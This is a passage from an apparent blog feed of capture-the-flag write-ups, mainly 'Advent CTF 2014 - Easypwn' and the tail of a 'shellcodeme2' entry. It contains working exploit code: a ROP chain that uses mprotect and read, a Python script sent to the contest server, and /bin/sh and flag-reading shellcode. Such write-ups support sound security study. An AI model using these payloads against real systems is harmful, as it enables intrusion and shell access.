(perl -e 'print "\x90\x06\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x8a\x06\x40\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x08\x10\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x00\x71\x06\x40\x00\x00\x00\x00\x00\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x8a\x06\x40\x00\x00\x00\x00\x00\xff\x03\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x28\xf0\x5f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x71\x06\x40\x00\x00\x00\x00\x00\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x00\x00\x00\x20\x00\x00\x00\x00"'; perl -e 'print "\xeb\x3f\x5f\x80\x77\x04\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xffflag\x41"') | ./shellcodeme2
ADCTF_I_l0v3_tH15_4W350M3_m15T4K
</code></pre>

<p>This one was tough, but a fun one nonetheless! ROP all the things! =)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Advent CTF 2014 - Easypwn]]></title>
    <link href="http://barrebas.github.io/blog/2014/12/21/advent-ctf-easypwn/"/>
    <updated>2014-12-21T10:24:42+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/12/21/advent-ctf-easypwn</id>
    <content type="html"><![CDATA[<p>Another pwnable, named &ldquo;easypwn&rdquo;, no less! Should be a walk in the park, right?</p>

<!-- more -->


<p>Of course, it turns out it wasn&rsquo;t! We&rsquo;re given only the executable. The challenge description informs us: no libs, ASLR enabled. Flag is in <code>/home/easypwn/flag</code>. Great! Disassembling the binary leads to the following code:</p>

<pre><code class="bash">bas@tritonal:~/adventctf$ objdump -d easypwn -M intel

easypwn:     file format elf32-i386


Disassembly of section .text:

08048080 &lt;syscall&gt;:
 8048080:   8b 54 24 0c             mov    edx,DWORD PTR [esp+0xc]
 8048084:   8b 4c 24 08             mov    ecx,DWORD PTR [esp+0x8]
 8048088:   8b 5c 24 04             mov    ebx,DWORD PTR [esp+0x4]
 804808c:   cd 80                   int    0x80
 804808e:   c3                      ret    
 804808f:   90                      nop

08048090 &lt;pwn_me&gt;:
 8048090:   83 ec 10                sub    esp,0x10
 8048093:   b9 ed 80 04 08          mov    ecx,0x80480ed
 8048098:   b8 04 00 00 00          mov    eax,0x4          # write
 804809d:   6a 08                   push   0x8
 804809f:   51                      push   ecx
 80480a0:   6a 01                   push   0x1              # stdout
 80480a2:   ff d6                   call   esi
 80480a4:   83 c4 0c                add    esp,0xc
 80480a7:   89 e1                   mov    ecx,esp
 80480a9:   b8 03 00 00 00          mov    eax,0x3          # read
 80480ae:   68 80 00 00 00          push   0x80             # 128 bytes
 80480b3:   51                      push   ecx
 80480b4:   6a 00                   push   0x0              # stdin
 80480b6:   ff d6                   call   esi
 80480b8:   83 c4 0c                add    esp,0xc
 80480bb:   83 c4 10                add    esp,0x10
 80480be:   c3                      ret    
 80480bf:   90                      nop

080480c0 &lt;_start&gt;:
 80480c0:   56                      push   esi
 80480c1:   be 80 80 04 08          mov    esi,0x8048080
 80480c6:   e8 c5 ff ff ff          call   8048090 &lt;pwn_me&gt;
 80480cb:   b9 f6 80 04 08          mov    ecx,0x80480f6
 80480d0:   b8 04 00 00 00          mov    eax,0x4          # write
 80480d5:   6a 13                   push   0x13             # 0x13 bytes
 80480d7:   51                      push   ecx
 80480d8:   6a 01                   push   0x1              # stdout
 80480da:   ff d6                   call   esi
 80480dc:   83 c4 0c                add    esp,0xc
 80480df:   b8 01 00 00 00          mov    eax,0x1          # exit
 80480e4:   6a 00                   push   0x0
 80480e6:   ff d6                   call   esi
 80480e8:   83 c4 04                add    esp,0x4
 80480eb:   5e                      pop    esi
 80480ec:   c3                      ret    
</code></pre>

<p>That&rsquo;s not a whole lot to work with. Running it gives a clue on what to do:</p>

<pre><code class="bash">bas@tritonal:~/adventctf$ ulimit -c unlimited
bas@tritonal:~/adventctf$ ./easypwn
pwn me: AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH
Segmentation fault (core dumped)
bas@tritonal:~/adventctf$ gdb ./easypwn core
...snip...
Core was generated by './easypwn'.
Program terminated with signal 11, Segmentation fault.
#0  0x45454545 in ?? ()
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : disabled
</code></pre>

<p>OK, so it&rsquo;s a buffer overflow, yet stack is not executable. The program uses no libraries but syscalls to do its work. We must be able to ROP our way to the flag! We have the syscall gadget lined up for us at <code>0x08048080</code>. Looks easy, right? Wrong!</p>

<p>There is one <strong>big</strong> problem:</p>

<pre><code class="bash">08048080 &lt;syscall&gt;:
 8048080:   8b 54 24 0c             mov    edx,DWORD PTR [esp+0xc]
 8048084:   8b 4c 24 08             mov    ecx,DWORD PTR [esp+0x8]
 8048088:   8b 5c 24 04             mov    ebx,DWORD PTR [esp+0x4]
 804808c:   cd 80                   int    0x80
 804808e:   c3                      ret    
 804808f:   90                      nop
</code></pre>

<p>We have <em>no way</em> to set <code>eax</code>! The <code>eax</code> register contains the syscall number and is kind of crucial to what we want. I uploaded the binary to <a href="https://ropshell.com">ropshell.com</a> but I found no straightforward way to set <code>eax</code>. I&rsquo;d prefer a <code>mov eax</code> or <code>pop eax</code>, or even <code>sub eax</code> or <code>xor eax</code>. Anything, really! I dumped the ROP gadgets with <a href="https://gist.github.com/barrebas/4fc86eaf0e9b124813a3">my own tool</a> and found this little gadget:</p>

<pre><code>RET: 0x80480e9: les eax, [esi+ebx*2]; ret;
</code></pre>

<p>Now this is a strange way to set <code>eax</code>. The <code>les</code> operand does the following: it loads the 48-bit value at the location of <code>esi+ebx*2</code> and sets <code>eax</code> to the first 32 bits and the <code>es</code> register to the last 16 bits. <em>However</em>, <code>es</code> does not tolerate just any old value. If the wrong value is passed, the program SEGFAULTS. To keep things simple, I looked for values in the binary like this: <code>0x0000000i, 0x0000</code>. This would load 0xi in <code>eax</code> and 0x0 in <code>es</code>.</p>

<p>It seemed nearly impossible to build a ROP chain that would open, read and write the data from the flag file. For instance, where would I write the filename? On the stack? ASLR is enabled so I&rsquo;d have no idea of knowing where the stack is. Instead, I went with a different strategy.</p>

<p>I am going to use the syscall <code>mprotect</code> to make the code section from 0x8048000 to 0x8049000 writeable. When this succeeds, I can use syscall <code>read</code> to read in any shellcode from stdin to the code section. Finally, I simply return to that region.</p>

<p>A problem here is that I can&rsquo;t set <code>eax</code> to 125 (==mprotect) with my little gadget. Instead, I re-use the return value of the last syscall before the buffer overflow: <code>read</code>! The return value of that syscall will be the number of bytes read&hellip; If we pass in 125 bytes as payload, then we get exactly the syscall number of mprotect in <code>eax</code>!</p>

<p>Here&rsquo;s what I came up with, bit by bit. I started the binary via socat, to emulate the target system:</p>

<pre><code class="bash">bas@tritonal:~/adventctf$ socat TCP-LISTEN:28099,fork EXEC:./easypwn
</code></pre>

<p>And this is the ROP chain I built:</p>

<pre><code class="python">#!/usr/bin/python

import struct
import socket
import telnetlib

SYSCALL = 0x8048080
POPRET = 0x80480eb  # pop esi; ret
ADDESP = 0x80480bb  # add esp, 0x10; ret
LESEAX = 0x80480e9  # les eax,FWORD PTR [esi+ebx*2]

def p(x):
  return struct.pack("&lt;L", x)

payload = ""

payload += "A"*16       # smash stack!

payload += p(SYSCALL)   # I rely on the return value of the read syscall
payload += p(ADDESP)    # fix stack with add esp, 10; ret
payload += p(0x8048000) # address to modify
payload += p(0x1000)    # length (page-aligned!)
payload += p(0x7)       # PROT_READ|PROT_WRITE|PROT_EXEC
payload += "AAAA"       # dummy value

# reset ebx so we can set eax using the next gadget
payload += p(SYSCALL)
payload += p(ADDESP)
payload += p(0)         # set ebx = 0
payload += p(0x1000)    # don't care
payload += p(0x7)       # don't care
payload += "AAAA"       # dummy

# set eax = 3
# 0x804834a:    0x00000003  0x00000000
payload += p(POPRET)    # pop esi; ret
payload += p(0x804834a) # set esi = 0x804834a
payload += p(LESEAX)    # eax -&gt; 0x3 == syscall_read

payload += p(SYSCALL)
payload += p(ADDESP)    # fix stack
payload += p(0)         # stdin
payload += p(0x8048000) # address of buffer
payload += p(0x200)     # number of bytes to read
payload += "BBBB"       # dummy value

payload += p(0x8048000) # return to shellcode!

# payload length must be 125, because after read, the next
# syscall is mprotect; eax = 125
payload += "A"*(125-len(payload))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#s.connect(("localhost",28099))
s.connect(("pwnable.katsudon.org",28099))

s.send(payload)

# http://www.shell-storm.org/shellcode/files/shellcode-851.php
s.send("\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68")

# the shell should have been spawned, so interact with it
t = telnetlib.Telnet()
t.sock = s
t.interact()
</code></pre>

<p>This first bit of python sets up the exploit. I have a helper function called <code>p(x)</code> that can dump addresses in the correct endianness into the payload. First, the payload consists of 16 bytes to smash the stack. Then, the ROP chain starts. Finally, I made sure that the first payload is 125 bytes, so that <code>eax</code> will contain the correct syscall number for mprotect. This first important part of the ROP chain looks like this:</p>

<pre><code class="python">payload += p(SYSCALL)   # I rely on the return value of the read syscall
payload += p(ADDESP)    # fix stack with add esp, 10; ret
payload += p(0x8048000) # address to modify
payload += p(0x1000)    # length (page-aligned!)
payload += p(0x7)       # PROT_READ|PROT_WRITE|PROT_EXEC
payload += "AAAA"       # dummy value
</code></pre>

<p>This will call <code>syscall(0x8048000, 0x1000, 0x7)</code> with <code>eax</code> set to 125. This makes the memory area at 0x8048000 writeable! Next, I need to read in the shellcode, but for that <code>eax</code> must be 3. I first reset <code>ebx</code>:</p>

<pre><code class="python"># reset ebx so we can set eax using the next gadget
payload += p(SYSCALL)
payload += p(ADDESP)
payload += p(0)         # set ebx = 0
payload += p(0x1000)    # don't care
payload += p(0x7)       # don't care
payload += "AAAA"       # dummy
</code></pre>

<p>Whatever this syscall is (I don&rsquo;t know the value of <code>eax</code> after the mprotect call, nor do I care), it fails but the side-effect is that <code>ebx</code> is now 0. That sets us up for moving the correct number in <code>eax</code>:</p>

<pre><code class="python"># set eax = 3
'''
0x804834a:  0x00000003  0x00000000
'''
payload += p(POPRET)    # pop esi; ret
payload += p(0x804834a) # set esi = 0x804834a
payload += p(LESEAX)    # eax -&gt; 0x3 == syscall_read
</code></pre>

<p>First, I use a <code>pop esi; ret</code> gadget to set the value of <code>esi</code> to a 48 bit value that contains: 0x3, 0x0. Then I return to the little gadget to set <code>eax</code> (and <code>es</code>) using those values. This results in <code>eax</code> being the correct number for the next syscall, read:</p>

<pre><code class="python">payload += p(SYSCALL)
payload += p(ADDESP)    # fix stack
payload += p(0)         # stdin
payload += p(0x8048000) # address of buffer
payload += p(0x200)     # number of bytes to read
payload += "BBBB"       # dummy value

payload += p(0x8048000)
</code></pre>

<p>This reads in <code>0x200</code> bytes from stdin to the start of the executable section of the binary. Finally, the ROP chain returns to the start of that buffer, which hopefully contains our shellcode! Finally, make sure that the payload is indeed 125 bytes long, else this entire house of cards falls down:</p>

<pre><code class="python"># payload length must be 125, because after read, the next
# syscall is mprotect; eax = 125
payload += "A"*(125-len(payload))
</code></pre>

<p>Because I ran the executable locally via socat, I need to connect to the proper socket and send the payload. The same goes for the remote connection.</p>

<pre><code class="python">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#s.connect(("localhost",28099))
s.connect(("pwnable.katsudon.org",28099))

s.send(payload)
</code></pre>

<p>After finishing the ROP chain, the binary should now be awaiting further shellcode on stdin, so I&rsquo;d better send that over quickly!</p>

<pre><code class="python"># http://www.shell-storm.org/shellcode/files/shellcode-851.php
s.send("\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68")

# the shell should have been spawned, so interact with it
t = telnetlib.Telnet()
t.sock = s
t.interact()
</code></pre>

<p>The shellcode is sent over; the ROP chain will read it at <code>0x8048000</code>, return to it and execute <code>/bin/sh</code>. Then I pass the socket to a telnet client to interact with the spawned shell. This allowed me to read the flag!</p>

<pre><code class="bash">bas@tritonal:~/adventctf$ python exploit_easy.py 
pwn me:
id
uid=1000(easypwn) gid=1000(easypwn) groups=1000(easypwn)
cat /home/easypwn/flag
ADCTF_175_345y_7o_cON7ROL_5Y5c4LL
</code></pre>

<p>The flag was <code>ADCTF_175_345y_7o_cON7ROL_5Y5c4LL</code>.</p>
]]></content>
  </entry>
  
</feed>
